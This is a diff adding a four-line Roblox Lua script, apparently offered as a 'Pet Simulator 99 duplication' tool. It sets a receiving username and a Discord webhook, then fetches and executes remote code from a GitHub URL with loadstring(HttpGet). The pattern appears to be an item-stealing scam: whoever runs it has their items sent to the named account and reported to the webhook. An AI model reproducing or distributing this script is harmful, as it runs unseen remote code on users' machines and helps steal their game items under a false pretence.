@@ -1,0 +1,4 @@
+Reciever = "DefinitelyNot_NoobX1" -- the username of the account you want the items to be gifted to. (aka you)
+Webhook = "https://discord.com/api/webhooks/1229338654598627392/3DqbD9ooRCkkSOY9ofk2H2SYqmwzZrYEWLsYPlfL9LxDhySyKMYP0HwWNI-XXihDl6id" -- leave as nil if you dont want it to send through a discord webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LyherScript/ps99-duplication/main/release", true))()
